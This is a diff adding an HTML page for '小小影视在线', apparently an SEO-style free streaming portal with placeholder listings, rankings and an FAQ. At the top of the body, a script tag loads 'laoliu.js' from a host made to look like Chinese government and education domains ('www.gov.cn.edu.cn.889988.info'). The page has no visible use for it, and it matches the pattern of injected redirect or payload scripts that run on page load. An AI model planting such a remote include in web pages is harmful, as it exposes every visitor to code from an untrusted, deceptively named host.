@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>小小影视在线 - 免费高清电影电视剧动漫综艺观看</title>
+<meta name="description" content="小小影视在线（xiaoxiaoyingshizaixian-h5.github.io）提供免费高清影视资源，涵盖电影、电视剧、动漫、综艺，支持手机端自适应在线观看。">
+<meta name="keywords" content="小小影视在线,影视在线观看,免费电影,电视剧在线,动漫综艺">
+<meta name="author" content="小小影视在线">
+<meta name="robots" content="index,follow">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", system-ui, -apple-system, sans-serif;
+  background: #f2f4f8;
+  color: #1f2430;
+  line-height: 1.65;
+}
+a { text-decoration: none; color: inherit; }
+img { max-width: 100%; }
+
+/* 顶部导航 */
+.topbar {
+  background: #ffffff;
+  border-bottom: 1px solid #e6e9f0;
+  position: sticky;
+  top: 0;
+  z-index: 999;
+}
+.topbar-inner {
+  max-width: 1180px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  flex-wrap: wrap;
+}
+.brand {
+  font-size: 20px;
+  font-weight: 800;
+  color: #ff5a5f;
+  letter-spacing: .5px;
+}
+.brand span { color: #2d3340; }
+.nav {
+  display: flex;
+  gap: 14px;
+  flex-wrap: wrap;
+}
+.nav a {
+  font-size: 14px;
+  padding: 6px 10px;
+  border-radius: 8px;
+  color: #55607a;
+}
+.nav a:hover { background: #fff0f0; color: #ff5a5f; }
+
+/* 通用容器 */
+.wrap { max-width: 1180px; margin: 0 auto; padding: 28px 16px; }
+.section-title {
+  font-size: 22px;
+  margin-bottom: 18px;
+  padding-left: 10px;
+  border-left: 4px solid #ff5a5f;
+  color: #2d3340;
+}
+
+/* Hero */
+.hero {
+  background: linear-gradient(120deg,#ff5a5f 0%, #ff8a5b 100%);
+  color: #fff;
+  border-radius: 16px;
+  padding: 36px 24px;
+  text-align: center;
+}
+.hero h1 { font-size: 30px; margin-bottom: 10px; }
+.hero p { opacity: .95; margin-bottom: 18px; }
+.hero-search {
+  display: flex;
+  max-width: 520px;
+  margin: 0 auto;
+  background: #fff;
+  border-radius: 999px;
+  overflow: hidden;
+}
+.hero-search input {
+  flex: 1;
+  border: none;
+  padding: 12px 18px;
+  font-size: 15px;
+  outline: none;
+}
+.hero-search button {
+  border: none;
+  background: #2d3340;
+  color: #fff;
+  padding: 0 22px;
+  cursor: pointer;
+  font-size: 15px;
+}
+
+/* 网格卡片 */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(4,1fr);
+  gap: 16px;
+}
+.card {
+  background: #fff;
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 6px 18px rgba(30,40,70,.06);
+  transition: transform .25s ease;
+}
+.card:hover { transform: translateY(-4px); }
+.thumb {
+  height: 120px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 34px;
+  color: #fff;
+}
+.t-red { background: linear-gradient(135deg,#ff5a5f,#ff8a5b); }
+.t-blue { background: linear-gradient(135deg,#3a7bd5,#3a6073); }
+.t-green { background: linear-gradient(135deg,#11998e,#38ef7d); }
+.t-purple { background: linear-gradient(135deg,#7f53ac,#647dee); }
+.card-body { padding: 12px 14px; }
+.card-body h3 { font-size: 15px; margin-bottom: 4px; }
+.card-body p { font-size: 12px; color: #79839b; }
+
+/* 分类胶囊 */
+.cat-list {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+.cat {
+  background: #fff;
+  border: 1px solid #e6e9f0;
+  border-radius: 999px;
+  padding: 10px 18px;
+  font-size: 14px;
+  color: #55607a;
+}
+.cat:hover { border-color: #ff5a5f; color: #ff5a5f; }
+
+/* 更新列表 */
+.update-list { background:#fff; border-radius:14px; padding:8px 18px; }
+.update-row {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 14px 0;
+  border-bottom: 1px dashed #eceef3;
+}
+.update-row:last-child { border-bottom: none; }
+.update-tag {
+  font-size: 12px;
+  background: #fff0f0;
+  color: #ff5a5f;
+  padding: 3px 10px;
+  border-radius: 6px;
+  white-space: nowrap;
+}
+.update-row h3 { font-size: 15px; flex: 1; }
+.update-row span.time { font-size: 12px; color: #98a1b5; }
+
+/* 排行榜表格 */
+.table-box { background:#fff; border-radius:14px; overflow:hidden; }
+table { width: 100%; border-collapse: collapse; font-size: 14px; }
+th, td { padding: 12px 14px; text-align: left; }
+thead { background: #2d3340; color: #fff; }
+tbody tr { border-bottom: 1px solid #f0f2f6; }
+tbody tr:hover { background: #fafbff; }
+.rank-no {
+  display: inline-block;
+  width: 22px; height: 22px;
+  line-height: 22px;
+  text-align: center;
+  border-radius: 6px;
+  background: #e6e9f0;
+  font-size: 12px;
+  font-weight: 700;
+}
+.rank-no.top { background: #ff5a5f; color: #fff; }
+
+/* FAQ */
+.faq-item {
+  background: #fff;
+  border-radius: 12px;
+  margin-bottom: 10px;
+  padding: 14px 18px;
+  border: 1px solid #eef0f5;
+}
+.faq-item h3 { font-size: 15px; color: #2d3340; margin-bottom: 6px; }
+.faq-item p { font-size: 13px; color: #66708a; }
+
+/* 页脚 */
+.footer {
+  background: #2d3340;
+  color: #c7cde0;
+  margin-top: 30px;
+  padding: 26px 16px;
+  text-align: center;
+  font-size: 13px;
+}
+.footer a { color: #ffd0d0; }
+
+/* 移动端 */
+@media (max-width: 900px) {
+  .grid { grid-template-columns: repeat(2,1fr); }
+}
+@media (max-width: 560px) {
+  .topbar-inner { flex-direction: column; gap: 8px; }
+  .nav { justify-content: center; }
+  .hero h1 { font-size: 24px; }
+  .grid { grid-template-columns: 1fr; }
+  .update-row { flex-wrap: wrap; }
+  table { font-size: 13px; }
+  th, td { padding: 10px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">小小影视<span>在线</span></div>
+    <nav class="nav">
+      <a href="#home">首页</a>
+      <a href="#cate">影视分类</a>
+      <a href="#update">今日更新</a>
+      <a href="#rank">热播排行</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1：首页 -->
+  <section id="home" class="hero">
+    <h1>小小影视在线</h1>
+    <p>免费高清影视一键观看，电影 / 电视剧 / 动漫 / 综艺每日更新</p>
+    <div class="hero-search">
+      <input type="text" placeholder="输入影视名称搜索">
+      <button type="button">搜索</button>
+    </div>
+  </section>
+
+  <!-- 栏目2：推荐网格 -->
+  <section id="recommend" style="margin-top:28px;">
+    <h2 class="section-title">精选推荐</h2>
+    <div class="grid">
+      <article class="card">
+        <div class="thumb t-red">🎬</div>
+        <div class="card-body">
+          <h3>热门电影</h3>
+          <p>院线大片 · 高清正片</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb t-blue">📺</div>
+        <div class="card-body">
+          <h3>热播剧集</h3>
+          <p>国产剧 · 美剧 · 韩剧</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb t-green">🧸</div>
+        <div class="card-body">
+          <h3>动漫专区</h3>
+          <p>国漫 · 日番 · 剧场版</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb t-purple">🎤</div>
+        <div class="card-body">
+          <h3>综艺娱乐</h3>
+          <p>真人秀 · 脱口秀</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目3：分类 -->
+  <section id="cate" style="margin-top:28px;">
+    <h2 class="section-title">影视分类</h2>
+    <div class="cat-list">
+      <a class="cat" href="#">动作冒险</a>
+      <a class="cat" href="#">喜剧搞笑</a>
+      <a class="cat" href="#">悬疑犯罪</a>
+      <a class="cat" href="#">爱情剧情</a>
+      <a class="cat" href="#">科幻特效</a>
+      <a class="cat" href="#">恐怖惊悚</a>
+      <a class="cat" href="#">动画少儿</a>
+      <a class="cat" href="#">纪录片</a>
+    </div>
+  </section>
+
+  <!-- 栏目4：今日更新 -->
+  <section id="update" style="margin-top:28px;">
+    <h2 class="section-title">今日更新</h2>
+    <div class="update-list">
+      <div class="update-row">
+        <span class="update-tag">更新至12集</span>
+        <h3>都市暗流·电视剧</h3>
+        <span class="time">2026-10-18</span>
+      </div>
+      <div class="update-row">
+        <span class="update-tag">正片</span>
+        <h3>星海归途·电影</h3>
+        <span class="time">2026-10-18</span>
+      </div>
+      <div class="update-row">
+        <span class="update-tag">第24话</span>
+        <h3>剑域苍穹·动漫</h3>
+        <span class="time">2026-10-18</span>
+      </div>
+      <div class="update-row">
+        <span class="update-tag">第8期</span>
+        <h3>周末笑声派对·综艺</h3>
+        <span class="time">2026-10-17</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5：排行榜 -->
+  <section id="rank" style="margin-top:28px;">
+    <h2 class="section-title">热播排行榜</h2>
+    <div class="table-box">
+      <table>
+        <thead>
+          <tr>
+            <th>排名</th>
+            <th>名称</th>
+            <th>类型</th>
+            <th>热度</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><span class="rank-no top">1</span></td>
+            <td>长安灯火</td>
+            <td>电视剧</td>
+            <td>9821</td>
+          </tr>
+          <tr>
+            <td><span class="rank-no top">2</span></td>
+            <td>深海回声</td>
+            <td>电影</td>
+            <td>8740</td>
+          </tr>
+          <tr>
+            <td><span class="rank-no top">3</span></td>
+            <td>灵契少年</td>
+            <td>动漫</td>
+            <td>7655</td>
+          </tr>
+          <tr>
+            <td><span class="rank-no">4</span></td>
+            <td>开心便利店</td>
+            <td>综艺</td>
+            <td>6320</td>
+          </tr>
+          <tr>
+            <td><span class="rank-no">5</span></td>
+            <td>追风者</td>
+            <td>电视剧</td>
+            <td>5988</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 栏目6：FAQ -->
+  <section id="faq" style="margin-top:28px;">
+    <h2 class="section-title">常见问题</h2>
+    <div class="faq-item">
+      <h3>小小影视在线是什么？</h3>
+      <p>小小影视在线是一个影视聚合导航类单页站点，方便用户快速查找电影、电视剧、动漫和综艺资源。</p>
+    </div>
+    <div class="faq-item">
+      <h3>网站支持手机端访问吗？</h3>
+      <p>支持，页面采用响应式布局，在手机、平板和电脑端均可自适应显示。</p>
+    </div>
+    <div class="faq-item">
+      <h3>网址是多少？</h3>
+      <p>官方地址：https://xiaoxiaoyingshizaixian-h5.github.io</p>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <p>网站名称：小小影视在线</p>
+  <p>网址：<a href="https://xiaoxiaoyingshizaixian-h5.github.io">https://xiaoxiaoyingshizaixian-h5.github.io</a></p>
+  <p>© 2026 小小影视在线 单页演示模板</p>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click', function(e){
+    var id = this.getAttribute('href');
+    if(id.length > 1){
+      var el = document.querySelector(id);
+      if(el){ e.preventDefault(); el.scrollIntoView({behavior:'smooth'}); }
+    }
+  });
+});
+</script>
+
+</body>
+</html>
